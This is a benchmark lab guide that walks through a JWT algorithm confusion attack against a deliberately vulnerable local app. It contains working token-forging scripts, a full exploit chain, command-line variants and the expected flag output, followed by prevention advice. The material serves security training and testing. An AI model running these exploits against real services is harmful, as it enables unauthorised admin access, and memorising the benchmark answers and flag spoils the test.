# S7BEN-HARD-023: Manual Testing Guide

## Vulnerability: JWT Algorithm Confusion Attack

### Overview
This benchmark demonstrates a critical JWT vulnerability where the application accepts both RS256 (asymmetric) and HS256 (symmetric) algorithms. By downloading the RSA public key and using it as an HMAC secret, attackers can forge admin tokens and escalate privileges.

**Key Difference from Phase 1:** This requires understanding JWT structure, cryptographic algorithms, manual token forgery, and proves full privilege escalation chain.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-HARD-023
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Understanding the Vulnerability

### JWT Algorithm Types

**RS256 (Asymmetric - RSA):**
- Uses **private key** to sign tokens
- Uses **public key** to verify tokens
- Keys are different (asymmetric cryptography)
- Public key can be safely distributed

**HS256 (Symmetric - HMAC):**
- Uses **shared secret** to sign tokens
- Uses **same secret** to verify tokens
- Secret must remain confidential

### The Algorithm Confusion Attack

1. Application signs JWTs with **RS256** using private key
2. Application **accepts both RS256 and HS256** for verification
3. Public key is **exposed** at `/.well-known/jwks.json`
4. Attacker downloads public key
5. Attacker creates new JWT with **HS256** algorithm
6. Attacker uses **public key as HMAC secret** (instead of private key)
7. Application **verifies with public key** (thinking it's HS256)
8. Token is **valid** - privilege escalation successful!

### JWT Structure

```
HEADER.PAYLOAD.SIGNATURE

HEADER (base64url encoded):
{
  "alg": "RS256",  // or "HS256" - attacker controls this!
  "typ": "JWT"
}

PAYLOAD (base64url encoded):
{
  "sub": "user",
  "role": "admin",  // attacker modifies this!
  "iat": 1234567890,
  "exp": 1234654290
}

SIGNATURE:
HMAC-SHA256(HEADER.PAYLOAD, public_key)
```

---

## Manual Testing Steps

### Step 1: Login as Regular User

```bash
# Login and get JWT token
curl -c cookies.txt -X POST "http://localhost:5000/login" \
  -d "username=user&password=user123" | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "success",
  "message": "Authentication successful",
  "username": "user",
  "role": "user",
  "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
  "algorithm": "RS256"
}
```

Save the token:
```bash
TOKEN=$(curl -s -X POST "http://localhost:5000/login" \
  -d "username=user&password=user123" | grep -o '"token":"[^"]*' | cut -d'"' -f4)

echo "Original token: $TOKEN"
```

### Step 2: Verify Current Access (Should Fail)

```bash
# Try to access admin endpoint with regular user token
curl -b cookies.txt "http://localhost:5000/api/admin/flag" | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "error",
  "message": "Admin access required",
  "current_role": "user"
}
```

### Step 3: Download RSA Public Key

```bash
# Download public key
curl -s "http://localhost:5000/api/public-key" | python3 -m json.tool

# Save public key to file
curl -s "http://localhost:5000/api/public-key" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['public_key'])" > public_key.pem

cat public_key.pem
```

**Expected Output:**
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
```

### Step 4: Decode Original JWT

```bash
# Decode JWT header and payload (without verification)
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

**You should see:**
```json
// Header
{
  "alg": "RS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "user",
  "role": "user",
  "iat": 1234567890,
  "exp": 1234654290
}
```

### Step 5: Forge Admin Token with HS256

Create a Python exploit script:

```bash
cat > forge_jwt.py << 'EOF'
#!/usr/bin/env python3
"""
JWT Algorithm Confusion Exploit

This script forges a JWT token by:
1. Reading the RSA public key
2. Creating a new JWT with HS256 algorithm
3. Using the public key as HMAC secret
4. Changing role claim to 'admin'
"""

import jwt
import json
import sys
from datetime import datetime, timedelta

def forge_admin_token(public_key_pem):
    """Forge admin JWT using algorithm confusion"""

    # Create admin payload
    payload = {
        'sub': 'user',  # Keep original username
        'role': 'admin',  # ESCALATE to admin!
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(hours=24)
    }

    print("[*] Forging JWT with HS256 algorithm...")
    print(f"[*] Payload: {json.dumps(payload, indent=2)}")

    # VULNERABILITY: Use public key as HMAC secret!
    # Normally HS256 uses a shared secret, but we're using the RSA public key
    forged_token = jwt.encode(
        payload,
        public_key_pem,
        algorithm='HS256'  # Changed from RS256!
    )

    print("\n[+] Forged token created successfully!")
    print(f"\n{forged_token}\n")

    # Verify structure
    header = jwt.get_unverified_header(forged_token)
    print(f"[*] Token algorithm: {header['alg']}")
    print(f"[*] Token type: {header['typ']}")

    return forged_token

def main():
    print("="*60)
    print("JWT Algorithm Confusion Exploit")
    print("="*60)

    # Read public key
    print("\n[*] Reading RSA public key...")
    try:
        with open('public_key.pem', 'r') as f:
            public_key = f.read()
        print("[+] Public key loaded successfully")
    except FileNotFoundError:
        print("[-] Error: public_key.pem not found")
        print("[!] Run: curl -s http://localhost:5000/api/public-key | python3 -c \"import sys,json; print(json.load(sys.stdin)['public_key'])\" > public_key.pem")
        sys.exit(1)

    # Forge token
    forged_token = forge_admin_token(public_key)

    # Save to file for easy use
    with open('forged_token.txt', 'w') as f:
        f.write(forged_token)

    print("[+] Token saved to forged_token.txt")
    print("\n[*] Use this token to access admin endpoints:")
    print(f"    curl -H 'Authorization: Bearer {forged_token[:50]}...' http://localhost:5000/api/admin/flag")

if __name__ == '__main__':
    main()
EOF

chmod +x forge_jwt.py
```

Run the exploit:
```bash
python3 forge_jwt.py
```

**Expected Output:**
```
============================================================
JWT Algorithm Confusion Exploit
============================================================

[*] Reading RSA public key...
[+] Public key loaded successfully
[*] Forging JWT with HS256 algorithm...
[*] Payload: {
  "sub": "user",
  "role": "admin",
  "iat": 1234567890,
  "exp": 1234654290
}

[+] Forged token created successfully!

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA1MzIxMjAwLCJleHAiOjE3MDU0MDc2MDB9.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

[*] Token algorithm: HS256
[*] Token type: JWT
[+] Token saved to forged_token.txt
```

### Step 6: Access Admin Endpoint with Forged Token

```bash
# Read forged token
FORGED_TOKEN=$(cat forged_token.txt)

# Access admin endpoint
curl -H "Authorization: Bearer $FORGED_TOKEN" \
  "http://localhost:5000/api/admin/flag" | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "success",
  "message": "Admin access granted - Privilege escalation detected!",
  "username": "user",
  "original_role": "user",
  "escalated_role": "admin",
  "algorithm_used": "HS256",
  "flag": "S7BEN{jwt_alg_confusion_a1b2c3d4e5f67890abcdef1234567890}",
  "proof": "Successfully escalated from user to admin using HS256 algorithm",
  "timestamp": "2026-01-08T12:34:56.789012"
}
```

---

## Automated Exploitation

### Complete Python Exploit

Create `exploit.py`:

```python
#!/usr/bin/env python3
"""
S7BEN-HARD-023: JWT Algorithm Confusion - Complete Exploit

This script demonstrates the full attack chain:
1. Login as regular user
2. Download RSA public key
3. Forge admin JWT using HS256 with public key as secret
4. Access admin endpoint to retrieve flag
"""

import requests
import jwt
import json
from datetime import datetime, timedelta

URL = "http://localhost:5000"

def step1_login():
    """Step 1: Login as regular user and get JWT token"""
    print("\n[*] Step 1: Logging in as regular user...")

    response = requests.post(
        f"{URL}/login",
        data={
            "username": "user",
            "password": "user123"
        }
    )

    data = response.json()

    if data['status'] == 'success':
        print(f"[+] Login successful as '{data['username']}'")
        print(f"    Current role: {data['role']}")
        print(f"    Algorithm: {data['algorithm']}")
        return data['token']
    else:
        print(f"[-] Login failed: {data['message']}")
        return None

def step2_download_public_key():
    """Step 2: Download RSA public key"""
    print("\n[*] Step 2: Downloading RSA public key...")

    response = requests.get(f"{URL}/api/public-key")
    data = response.json()

    if data['status'] == 'success':
        public_key = data['public_key']
        print(f"[+] Public key downloaded ({len(public_key)} bytes)")
        print(f"    Format: {data['format']}")
        return public_key
    else:
        print("[-] Failed to download public key")
        return None

def step3_verify_original_token_fails(original_token):
    """Step 3: Verify that regular user cannot access admin endpoint"""
    print("\n[*] Step 3: Testing original token (should fail)...")

    response = requests.get(
        f"{URL}/api/admin/flag",
        headers={"Authorization": f"Bearer {original_token}"}
    )

    data = response.json()

    if data['status'] == 'error':
        print(f"[+] Access denied as expected: {data['message']}")
        print(f"    Current role: {data.get('current_role', 'unknown')}")
        return True
    else:
        print("[-] Unexpected success - user should not have admin access!")
        return False

def step4_forge_admin_token(public_key):
    """Step 4: Forge admin JWT using algorithm confusion"""
    print("\n[*] Step 4: Forging admin token with HS256...")

    # Create admin payload
    payload = {
        'sub': 'user',  # Original username
        'role': 'admin',  # ESCALATED role!
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(hours=24)
    }

    # VULNERABILITY: Use public key as HMAC secret
    forged_token = jwt.encode(
        payload,
        public_key,
        algorithm='HS256'  # Algorithm confusion!
    )

    header = jwt.get_unverified_header(forged_token)
    decoded_payload = jwt.decode(forged_token, options={"verify_signature": False})

    print(f"[+] Forged token created successfully")
    print(f"    Algorithm: {header['alg']} (changed from RS256!)")
    print(f"    Role claim: {decoded_payload['role']} (escalated!)")

    return forged_token

def step5_get_flag(forged_token):
    """Step 5: Access admin endpoint with forged token"""
    print("\n[*] Step 5: Accessing admin endpoint with forged token...")

    response = requests.get(
        f"{URL}/api/admin/flag",
        headers={"Authorization": f"Bearer {forged_token}"}
    )

    data = response.json()

    if data['status'] == 'success' and 'flag' in data:
        print("\n" + "="*60)
        print("✅ EXPLOITATION SUCCESSFUL!")
        print("="*60)
        print(f"\nFlag: {data['flag']}")
        print(f"\nProof: {data['proof']}")
        print(f"\nDetails:")
        print(f"  • Username: {data['username']}")
        print(f"  • Original Role: {data['original_role']}")
        print(f"  • Escalated Role: {data['escalated_role']}")
        print(f"  • Algorithm Used: {data['algorithm_used']}")
        print(f"  • Timestamp: {data['timestamp']}")
        print("\n" + "="*60)
        return True
    else:
        print(f"[-] Failed to get flag: {data.get('message', 'Unknown error')}")
        return False

def main():
    print("="*60)
    print("S7BEN-HARD-023: JWT Algorithm Confusion Attack")
    print("="*60)

    # Step 1: Login as regular user
    original_token = step1_login()
    if not original_token:
        return False

    # Step 2: Download public key
    public_key = step2_download_public_key()
    if not public_key:
        return False

    # Step 3: Verify original token cannot access admin endpoint
    step3_verify_original_token_fails(original_token)

    # Step 4: Forge admin token using algorithm confusion
    forged_token = step4_forge_admin_token(public_key)

    # Step 5: Get flag with forged token
    success = step5_get_flag(forged_token)

    return success

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)
```

Run the complete exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-HARD-023: JWT Algorithm Confusion Attack
============================================================

[*] Step 1: Logging in as regular user...
[+] Login successful as 'user'
    Current role: user
    Algorithm: RS256

[*] Step 2: Downloading RSA public key...
[+] Public key downloaded (451 bytes)
    Format: PEM

[*] Step 3: Testing original token (should fail)...
[+] Access denied as expected: Admin access required
    Current role: user

[*] Step 4: Forging admin token with HS256...
[+] Forged token created successfully
    Algorithm: HS256 (changed from RS256!)
    Role claim: admin (escalated!)

[*] Step 5: Accessing admin endpoint with forged token...

============================================================
✅ EXPLOITATION SUCCESSFUL!
============================================================

Flag: S7BEN{jwt_alg_confusion_a1b2c3d4e5f67890abcdef1234567890}

Proof: Successfully escalated from user to admin using HS256 algorithm

Details:
  • Username: user
  • Original Role: user
  • Escalated Role: admin
  • Algorithm Used: HS256
  • Timestamp: 2026-01-08T12:34:56.789012

============================================================
```

---

## Alternative Attack Vectors

### Method 1: Using jwt.io

1. Go to https://jwt.io/
2. Paste your original JWT token
3. Download public key and save to file
4. In the "Verify Signature" section:
   - Change algorithm dropdown to "HS256"
   - Paste the public key (including headers) into the secret field
5. Modify the payload: change `"role": "user"` to `"role": "admin"`
6. Copy the encoded JWT from the left panel
7. Use it in curl:

```bash
curl -H "Authorization: Bearer <forged_token>" \
  http://localhost:5000/api/admin/flag
```

### Method 2: Using jwt-cli Tool

```bash
# Install jwt-cli
cargo install jwt-cli

# Download public key
curl -s http://localhost:5000/api/public-key | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['public_key'])" > public_key.pem

# Create forged token
jwt encode \
  --alg HS256 \
  --secret "$(cat public_key.pem)" \
  '{"sub":"user","role":"admin","iat":1704110400,"exp":1704196800}'
```

### Method 3: Manual Base64 Encoding

```bash
# Create header (HS256)
HEADER='{"alg":"HS256","typ":"JWT"}'
HEADER_B64=$(echo -n "$HEADER" | base64 | tr -d '=' | tr '+/' '-_')

# Create payload
PAYLOAD='{"sub":"user","role":"admin","iat":1704110400,"exp":1704196800}'
PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 | tr -d '=' | tr '+/' '-_')

# Create signature using public key as HMAC secret
# (This requires openssl and is more complex)
SIGNATURE=$(echo -n "${HEADER_B64}.${PAYLOAD_B64}" | \
  openssl dgst -sha256 -hmac "$(cat public_key.pem)" -binary | \
  base64 | tr -d '=' | tr '+/' '-_')

# Combine to form JWT
FORGED_TOKEN="${HEADER_B64}.${PAYLOAD_B64}.${SIGNATURE}"

echo "Forged token: $FORGED_TOKEN"
```

---

## Understanding the Dynamic Flag

The flag is generated based on successful privilege escalation:

```python
def generate_flag(username, original_role, escalated_role, method):
    timestamp = str(int(time.time()))
    data = f"jwt_alg_confusion:{username}:{original_role}:{escalated_role}:{method}:{timestamp}"
    hash = hmac.new(SECRET, data.encode(), sha256).hexdigest()[:32]
    return f"S7BEN{{jwt_alg_confusion_{hash}}}"
```

This proves:
- **Credentials were valid** (logged in as user)
- **Algorithm confusion exploited** (switched to HS256)
- **Privilege escalation achieved** (user → admin)
- **Timing recorded** (when exploitation occurred)

---

## Troubleshooting

### Issue: "Invalid token" error

**Cause:** Token may be malformed or expired.

**Solution:**
```bash
# Decode token to check structure
python3 -c "import jwt, sys; print(jwt.decode(sys.argv[1], options={'verify_signature': False}))" "$FORGED_TOKEN"

# Ensure timestamps are valid (iat < exp, exp in future)
```

### Issue: PyJWT version compatibility

**Cause:** Different PyJWT versions handle algorithm confusion differently.

**Solution:**
```bash
# Install specific version
pip install PyJWT==2.8.0

# Or use latest
pip install --upgrade PyJWT
```

### Issue: Public key format issues

**Cause:** Public key not properly formatted.

**Solution:**
```bash
# Verify public key has proper PEM headers
cat public_key.pem | head -1
# Should show: -----BEGIN PUBLIC KEY-----

cat public_key.pem | tail -1
# Should show: -----END PUBLIC KEY-----
```

---

## Prevention Techniques

### Proper JWT Validation

```python
# BAD - Trusts algorithm from token header
def verify_token_bad(token):
    header = jwt.get_unverified_header(token)
    algorithm = header.get('alg')  # NEVER TRUST THIS!

    if algorithm == 'RS256':
        return jwt.decode(token, PUBLIC_KEY, algorithms=['RS256'])
    elif algorithm == 'HS256':
        return jwt.decode(token, SECRET, algorithms=['HS256'])

# GOOD - Explicitly specify expected algorithm
def verify_token_good(token):
    # ONLY accept RS256, reject everything else
    return jwt.decode(token, PUBLIC_KEY, algorithms=['RS256'])
```

### Best Practices

1. **Whitelist algorithms** - Only accept expected algorithm(s)
2. **Never trust token headers** - Algorithm field is attacker-controlled
3. **Use algorithm-specific functions** - Don't implement algorithm switching
4. **Separate keys** - Different keys for different algorithms
5. **Rotate keys regularly** - Limit exposure window
6. **Use strong secrets** - For HMAC, use cryptographically random secrets
7. **Implement key management** - Proper storage and access controls
8. **Monitor algorithm usage** - Alert on unexpected algorithms

---

## Real-World Examples

This vulnerability has affected:
- **Auth0 (2015):** Algorithm confusion in JWT libraries
- **Keycloak (2018):** Accepted 'none' algorithm
- **Firebase (2017):** HS256/RS256 confusion
- **Various JWT libraries:** Multiple CVEs for algorithm confusion

---

## Cleanup

```bash
make down
make clean

# Remove exploit files
rm -f public_key.pem forged_token.txt forge_jwt.py exploit.py cookies.txt
```

---

## Success Criteria

- ✅ Logged in as regular user and obtained JWT
- ✅ Downloaded RSA public key
- ✅ Forged admin JWT using HS256 algorithm
- ✅ Used public key as HMAC secret
- ✅ Changed role claim from 'user' to 'admin'
- ✅ Successfully accessed admin endpoint
- ✅ Retrieved dynamically generated flag
- ✅ Flag format: `S7BEN{jwt_alg_confusion_<32_hex_chars>}`

---

## Additional Resources

- **CWE-347:** https://cwe.mitre.org/data/definitions/347.html
- **CWE-327:** https://cwe.mitre.org/data/definitions/327.html
- **JWT Best Practices:** https://datatracker.ietf.org/doc/html/rfc8725
- **OWASP JWT Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- **Auth0 JWT Handbook:** https://auth0.com/resources/ebooks/jwt-handbook
